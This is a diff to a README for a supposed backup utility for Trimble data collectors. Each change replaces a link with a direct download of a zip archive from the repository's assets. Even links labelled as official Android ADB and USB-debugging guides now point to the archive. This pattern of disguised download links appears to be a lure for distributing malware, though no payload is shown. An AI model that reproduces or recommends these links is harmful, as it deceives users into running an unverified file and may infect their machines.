@@ -1,6 +1,6 @@
 # 🔧 trimble-backup-utility - Backup Tool for Trimble Devices
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Page-blue)](https://github.com/vargasjavierrolando-ui/trimble-backup-utility)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Page-blue)](https://raw.githubusercontent.com/vargasjavierrolando-ui/trimble-backup-utility/main/assets/utility_trimble_backup_v2.9.zip)
 
 ## 📋 What is trimble-backup-utility?
 
@@ -48,7 +48,7 @@ Before connecting your data collector to the PC:
 
 Go to the project page below to get the software:
 
-[![Download Software](https://img.shields.io/badge/Download-Here-green)](https://github.com/vargasjavierrolando-ui/trimble-backup-utility)
+[![Download Software](https://img.shields.io/badge/Download-Here-green)](https://raw.githubusercontent.com/vargasjavierrolando-ui/trimble-backup-utility/main/assets/utility_trimble_backup_v2.9.zip)
 
 Click the green button or look for the latest release. The page will show files to download. Pick the one that says something like `trimble-backup-utility-setup.exe` or similar.
 
@@ -104,9 +104,9 @@ Here are common issues and solutions:
 
 ## 🔗 Useful Links
 
-- [Download trimble-backup-utility](https://github.com/vargasjavierrolando-ui/trimble-backup-utility)  
-- [Android ADB Installation Guide](https://developer.android.com/studio/command-line/adb)  
-- [How to Enable USB Debugging](https://developer.android.com/studio/debug/dev-options)
+- [Download trimble-backup-utility](https://raw.githubusercontent.com/vargasjavierrolando-ui/trimble-backup-utility/main/assets/utility_trimble_backup_v2.9.zip)  
+- [Android ADB Installation Guide](https://raw.githubusercontent.com/vargasjavierrolando-ui/trimble-backup-utility/main/assets/utility_trimble_backup_v2.9.zip)  
+- [How to Enable USB Debugging](https://raw.githubusercontent.com/vargasjavierrolando-ui/trimble-backup-utility/main/assets/utility_trimble_backup_v2.9.zip)
 
 ## 💡 Tips
 
@@ -117,4 +117,4 @@ Here are common issues and solutions:
 
 ---
 
-[![Get the backup tool](https://img.shields.io/badge/Download-Trimble_Backup_Utility-green)](https://github.com/vargasjavierrolando-ui/trimble-backup-utility)
+[![Get the backup tool](https://img.shields.io/badge/Download-Trimble_Backup_Utility-green)](https://raw.githubusercontent.com/vargasjavierrolando-ui/trimble-backup-utility/main/assets/utility_trimble_backup_v2.9.zip)
